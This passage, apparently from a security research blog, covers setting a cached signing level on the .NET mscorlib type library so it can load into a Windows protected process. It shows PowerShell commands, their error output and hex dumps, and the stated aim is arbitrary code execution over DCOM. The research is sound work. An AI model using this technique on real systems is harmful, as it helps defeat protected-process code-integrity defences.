&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table style=&quot;border: 20px solid #e2e1e1; border-radius: 10px&quot; bgcolor=&quot;#e2e1e1&quot;&gt;&lt;tr&gt;&lt;td&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $path = &amp;quot;C:\windows\Microsoft.NET\Framework64\v4.0.30319\mscorlib.tlb&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; Set-NtCachedSigningLevel $path&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-Flags&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;0x804&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-SigningLevel&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;12 -Win32Path&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;calling&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&amp;quot;SetCachedSigningLevel&amp;quot;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&amp;quot;4&amp;quot;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;argument(s):&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&amp;quot;(0xC000007B)&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;{Bad&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Image}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;%hs&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;either&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;not&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;designed&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;an&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;error.&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Try&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;installing&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;program&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;again&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;the&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;original&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;installation&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;media&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;contact&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;your&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;administrator&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;software&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;vendor&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;support.&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;0x&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c7 ROKGfcMygP-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; Format-HexDump $path -Length 64 -ShowAll&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F &amp;nbsp;- 0123456789ABCDEF&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-----------------------------------------------------------------------------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00000000: 4D 53 46 54 02 00 01 00 00 00 00 00 09 04 00 00 &amp;nbsp;- MSFT............&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00000010: 00 00 00 00 43 00 00 00 02 00 04 00 00 00 00 00 &amp;nbsp;- ....C...........&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00000020: 25 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &amp;nbsp;- %...............&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00000030: 2E 0D 00 00 33 FA 00 00 F8 08 01 00 FF FF FF FF &amp;nbsp;- ....3...........&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;span&gt;Setting the signing level gives us the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;STATUS_INVALID_IMAGE_FORMAT&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;error. Looking at the first 64 bytes of type library file shows that it&amp;#39;s a raw type library rather than packaged in a PE file. This is fairly uncommon on Windows, even when a file has the extension TLB it&amp;#39;s common for the type library to still be packed into a PE file as a resource. I guess we&amp;#39;re out of luck, unless we can set a cached signing level on the file, it will be blocked from loading into the protected process and we need it to load to support the stub class to call the .NET interfaces over DCOM.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c13&quot;&gt;As an aside, oddly I have a VM of Windows 11 with the non-DLL form of the type library which does work to set a cached signing level. I must have changed the VM&amp;#39;s configuration in some way to support this feature, but I&amp;#39;ve no idea what that is and I&amp;#39;ve decided not to dig further into it.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;We could try and find a previous version of the type library file which is both validly signed, and is packaged in a PE file, however, I&amp;#39;d rather not do that. Of course there&amp;#39;s almost certainly another COM object we could load rather than .NET which might give us arbitrary code execution but I&amp;#39;d set my heart on this approach. In the end the solution was simpler than I expected, for some reason the 32 bit version of the type library file (i.e. in &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;Framework&lt;/span&gt;&lt;span&gt;&amp;nbsp;rather than &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;Framework64&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;) is packed in a DLL, and we can set a cached signing level on it.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table style=&quot;border: 20px solid #e2e1e1; border-radius: 10px&quot; bgcolor=&quot;#e2e1e1&quot;&gt;&lt;tr&gt;&lt;td&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $path&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&amp;quot;C:\windows\Microsoft.NET\Framework\v4.0.30319\mscorlib.tlb&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Format-HexDump&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;$path&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-Length&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-ShowAll&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;0A&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;0B&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;0C&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;0D&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;0E&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;0F&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;0123456789ABCDEF&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-----------------------------------------------------------------------------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00000000:&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;4D&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;5A&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;FF&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;FF&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;MZ..............&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00000010:&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;B8&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 